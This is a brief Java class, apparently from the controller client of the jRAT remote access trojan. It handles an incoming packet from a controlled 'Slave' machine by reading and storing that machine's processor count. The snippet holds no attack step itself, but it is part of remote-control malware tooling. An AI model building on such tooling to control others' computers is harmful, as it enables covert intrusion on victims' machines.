package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;

import java.io.DataInputStream;


public class Packet64InitAvailableProcessors extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short processors = slave.readShort();
		slave.setProcessors(processors);
	}

}
